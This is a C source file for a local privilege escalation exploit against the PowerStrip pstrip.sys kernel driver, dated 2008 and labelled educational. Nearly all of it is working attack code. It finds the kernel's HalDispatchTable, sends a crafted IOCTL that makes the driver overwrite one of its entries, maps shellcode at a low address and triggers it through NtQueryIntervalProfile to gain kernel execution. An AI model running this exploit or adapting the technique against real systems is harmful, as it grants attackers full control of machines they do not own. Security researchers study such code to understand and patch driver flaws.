////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | EnTech Taiwan - http://www.entechtaiwan.com/                               | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | PowerStrip <= 3.84                                                         | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | PowerStrip support NT kernel-mode driver - pstrip.sys <= 5.0.1.1           | //
// |                                                                            | //
// | Local Privilege Escalation Exploit                                         | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 20 December 2008                                                           | //
// |                                                                            | //
// | References:                                                                | //
// | Exploiting Common Flaws in Drivers                                         | //
// | Ruben Santamarta - http://reversemode.com/                                 | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "PowerStrip_Exp.h"
#include "InvbShellCode.h"


#define IOCTL_VULNERABLE 0x800020A8
#define BUFFER_LENGTH 0x0C


int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    ULONG AllocationSize = PAGE_SIZE * 64;
    HANDLE DeviceHandle;
    
    ULONG ImageBase;
    PVOID MappedBase;
    UCHAR ImageName[KERNEL_NAME_LENGTH];
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
    PVOID HalDispatchTable;

    ULONG ShellCodeSize = PAGE_SIZE;
    PVOID ShellCodeAddress;
    PVOID BaseAddress = NULL;

    UNICODE_STRING ObjectName;
    UNICODE_STRING DllName;
    ANSI_STRING ProcedureName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    PSYSTEM_MODULE_INFORMATION_EX ModuleInformation = NULL;
    LARGE_INTEGER Interval;

    ULONG SystemBuffer[BUFFER_LENGTH / 4];

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    system("cls");

    
    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(), // ProcessHandle
                                       &ModuleInformation, // BaseAddress
                                       0,                  // ZeroBits
                                       &AllocationSize,    // AllocationSize
                                       MEM_COMMIT,         // AllocationType
                                       PAGE_READWRITE);    // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

        NtStatus = NtQuerySystemInformation(
                                        SystemModuleInformation,
                                        (PSYSTEM_MODULE_INFORMATION_EX)ModuleInformation,
                                        AllocationSize,
                                        NULL);
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation [3] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
        
    ImageBase = (ULONG)(ModuleInformation->Modules[0].Base);


    RtlMoveMemory(
                  ImageName,
                  (PVOID)(ModuleInformation->Modules[0].ImageName +
                  ModuleInformation->Modules[0].ModuleNameOffset),
                  KERNEL_NAME_LENGTH);

    printf( " +----------------------------------------------------------------------------+\n"
            " | ImageBase - 0x%.8X                                                     |\n"
            " | ImageName - %s                                                   |\n",
            ImageBase,
            ImageName);


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(), // ProcessHandle
                                   &ModuleInformation, // BaseAddress
                                   &AllocationSize,    // FreeSize
                                   MEM_DECOMMIT);      // FreeType

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [1] - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);


    NtStatus = LdrLoadDll(
                          NULL,                // DllPath
                          &DllCharacteristics, // DllCharacteristics
                          &DllName,            // DllName
                          &MappedBase);        // DllHandle

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrLoadDll - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlInitAnsiString(&ProcedureName, "HalDispatchTable");


    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,          // DllHandle
                                      &ProcedureName,             // ProcedureName
                                      0,                          // ProcedureNumber OPTIONAL
                                      (PVOID*)&HalDispatchTable); // ProcedureAddress

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)HalDispatchTable -= (ULONG)MappedBase;
    (ULONG)HalDispatchTable += ImageBase;

    ///////////////////////////////////////////////////////////////////////////////////////////////

     printf(" |                                                                            |\n"
            " | HalDispatchTable - 0x%.8X                                              |\n"
            " +----------------------------------------------------------------------------+\n",
            HalDispatchTable);


    NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);

	if(NtStatus)
	{
		printf(" [*] NtStatus of XxInitInbv - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}

    RtlFreeUnicodeString(&DllName);
    RtlFreeAnsiString(&ProcedureName);

    LdrUnloadDll((PVOID)MappedBase);
    
    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlInitUnicodeString(&ObjectName, L"\\Device\\PowerStrip1");

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = 0;
    ObjectAttributes.ObjectName = &ObjectName;
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = NULL;

    
    NtStatus = NtCreateFile(
                            &DeviceHandle,                      // FileHandle
                            FILE_READ_DATA | FILE_WRITE_DATA,   // DesiredAccess
                            &ObjectAttributes,                  // ObjectAttributes
                            &IoStatusBlock,                     // IoStatusBlock
                            NULL,                               // AllocationSize OPTIONAL
                            0,                                  // FileAttributes
                            FILE_SHARE_READ | FILE_SHARE_WRITE, // ShareAccess
                            FILE_OPEN_IF,                       // CreateDisposition
                            0,                                  // CreateOptions
                            NULL,                               // EaBuffer OPTIONAL
                            0);                                 // EaLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtCreateFile - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlFreeUnicodeString(&ObjectName);

    ///////////////////////////////////////////////////////////////////////////////////////////////

	SystemBuffer[0] = 0x11111111;
	SystemBuffer[1] = (ULONG)HalDispatchTable;
    SystemBuffer[2] = (ULONG)HalDispatchTable;

    NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,     // FileHandle
                                     NULL,             // Event
                                     NULL,             // ApcRoutine
                                     NULL,             // ApcContext
                                     &IoStatusBlock,   // IoStatusBlock
                                     IOCTL_VULNERABLE, // IoControlCode
                                     SystemBuffer,     // InputBuffer
                                     BUFFER_LENGTH,    // InputBufferLength
                                     SystemBuffer,     // OutputBuffer
                                     BUFFER_LENGTH);   // OutBufferLength
    
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    ShellCodeAddress = (PVOID)sizeof(ULONG);


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &ShellCodeAddress,
                                       0,
                                       &ShellCodeSize,
                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                       PAGE_EXECUTE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlMoveMemory(ShellCodeAddress, (PVOID)InbvShellCode, ShellCodeSize);


    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf("\n 3");
    NtDelayExecution(FALSE, &Interval);

    printf(" 2");
    NtDelayExecution(FALSE, &Interval);

    printf(" 1");
    NtDelayExecution(FALSE, &Interval);

    printf(" Hoop\n\n");
    NtDelayExecution(FALSE, &Interval);


    NtStatus = NtQueryIntervalProfile(
                                      ProfileTotalIssues, // Source
                                      NULL);              // Interval

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQueryIntervalProfile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }
    

    NtStatus = NtClose(DeviceHandle);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    return FALSE;
}